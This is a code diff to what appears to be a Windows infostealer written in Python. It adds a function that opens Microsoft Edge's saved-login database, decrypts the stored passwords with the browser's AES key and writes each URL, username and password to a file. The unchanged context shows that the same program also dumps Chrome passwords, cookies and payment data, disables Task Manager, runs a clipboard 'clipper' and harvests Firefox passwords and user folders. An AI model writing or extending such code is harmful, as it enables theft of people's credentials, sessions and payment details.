@@ -238,6 +238,39 @@ def decrypt(buff, aes_key):
             return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode("utf-8", errors="ignore")
     except Exception as e:
         return f"[FAILED: {e}]"
+    
+import sqlite3
+
+def dump_edge_passwords():
+    """Directly decrypts & writes Edge Default/login Data → passwords.txt"""
+    login_db = os.path.join(BROWSERS["Edge"], "Default", "Login Data")
+    out_dir  = os.path.join(EXTRACT_FOLDER, "Edge", "Default")
+    os.makedirs(out_dir, exist_ok=True)
+    out_txt  = os.path.join(out_dir, "passwords.txt")
+    if not os.path.isfile(login_db):
+        return
+
+    # grab AES key (same method you use for Chrome)
+    aes_key = get_key(os.path.join(BROWSERS["Edge"], ".."))
+
+    try:
+        con = sqlite3.connect(login_db)
+        cur = con.cursor()
+        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+        rows = cur.fetchall()
+        con.close()
+    except:
+        return
+
+    with open(out_txt, "w", encoding="utf-8", errors="ignore") as f:
+        f.write("=== Edge | Default → Passwords ===\n\n")
+        for url, user, buff in rows:
+            try:
+                pwd = decrypt(buff, aes_key)
+            except:
+                pwd = "[DECRYPT FAIL]"
+            f.write(f"{url} | {user} | {pwd}\n")
+
 
 
 
@@ -322,7 +355,10 @@ def extr_browser():
                         for entry in data:
                             # 3 common types: passwords / cookies / payments
                             if base == "passwords":
-                                tf.write(f"{entry.get('origin','')} | {entry.get('username','')} | {entry.get('password','')}\n")
+                                # only do Chrome here; Edge passwords will be dumped separately
+                                if browser_label == "Chrome":
+                                    tf.write(f"{entry.get('origin','')} | {entry.get('username','')} | {entry.get('password','')}\n")
+
                             elif base == "cookies":
                                 tf.write(f"{entry.get('host','')} | {entry.get('name','')} = {entry.get('value','')}\n")
                             elif base == "payments":
@@ -830,6 +866,7 @@ def run():
                 kill_taskmgr_once()
                 clipper()
                 extr_browser()
+                dump_edge_passwords()
                 extr_firefox_passwords()
                 grab_user_dirs() 
                 time.sleep(1)
